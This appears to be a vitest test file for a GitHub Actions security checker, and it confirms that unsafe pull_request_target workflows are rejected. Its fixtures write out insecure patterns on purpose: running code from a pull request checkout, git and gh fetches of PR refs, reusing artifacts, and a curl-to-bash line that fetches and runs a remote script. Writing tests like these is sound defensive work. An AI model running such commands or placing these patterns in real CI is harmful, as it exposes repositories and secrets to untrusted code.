import { readFileSync } from 'node:fs';
import { CI_TEMPLATE_PATH, REQUIRED_CI_TEMPLATE_PATH } from '@crucible/ci-templates';
import { describe, expect, it } from 'vitest';
import { inspectWorkflowSecurity } from './workflow-security.js';

function privileged(steps: string): string {
  return `name: unsafe
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${steps}
`;
}

describe('P4R-10E pull_request_target candidate-execution guard', () => {
  it.each([CI_TEMPLATE_PATH, REQUIRED_CI_TEMPLATE_PATH])(
    'accepts shipped restricted-event template %s',
    (path) => {
      expect(inspectWorkflowSecurity(readFileSync(path, 'utf8'), path)).toEqual({
        supported: true,
        privileged_candidate_execution: false,
        violations: [],
      });
    },
  );

  it('rejects direct candidate checkout followed by execution', () => {
    const report = inspectWorkflowSecurity(
      privileged(`      - uses: actions/checkout@${'1'.repeat(40)}
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: npm test`),
      'direct.yml',
    );
    expect(report.supported).toBe(false);
    expect(report.violations.map((item) => item.code)).toEqual(
      expect.arrayContaining(['candidate-checkout', 'candidate-execution']),
    );
  });

  it.each([
    [
      'git fetch',
      'git fetch origin "refs/pull/${{ github.event.pull_request.number }}/head" && npm test',
    ],
    ['gh checkout', 'gh pr checkout "${{ github.event.pull_request.number }}" && make test'],
    [
      'remote script',
      'curl "https://raw.example/${{ github.event.pull_request.head.sha }}/test.sh" | bash',
    ],
  ])('rejects indirect candidate-controlled script loading via %s', (_name, command) => {
    const report = inspectWorkflowSecurity(
      privileged(`      - run: ${JSON.stringify(command)}`),
      'indirect.yml',
    );
    expect(report.supported).toBe(false);
    expect(report.violations.map((item) => item.code)).toContain('indirect-candidate-load');
  });

  it('rejects untrusted artifact reuse followed by execution', () => {
    const report = inspectWorkflowSecurity(
      privileged(`      - uses: actions/download-artifact@${'2'.repeat(40)}
        with:
          run-id: \${{ github.event.workflow_run.id }}
      - run: ./artifact/test.sh`),
      'artifact.yml',
    );
    expect(report.supported).toBe(false);
    expect(report.violations.map((item) => item.code)).toEqual(
      expect.arrayContaining(['candidate-artifact-reuse', 'candidate-execution']),
    );
  });

  it('rejects candidate-controlled local actions in the privileged workspace', () => {
    const report = inspectWorkflowSecurity(
      privileged(`      - uses: actions/checkout@${'1'.repeat(40)}
        with:
          repository: \${{ github.event.pull_request.head.repo.full_name }}
          ref: \${{ github.event.pull_request.head.sha }}
      - uses: ./.github/actions/test`),
      'local-action.yml',
    );
    expect(report.violations.map((item) => item.code)).toContain('candidate-action-execution');
  });

  it('fails closed on malformed workflow YAML', () => {
    const report = inspectWorkflowSecurity('on: [pull_request_target\njobs:', 'broken.yml');
    expect(report.supported).toBe(false);
    expect(report.violations[0]?.code).toBe('malformed-workflow');
  });
});
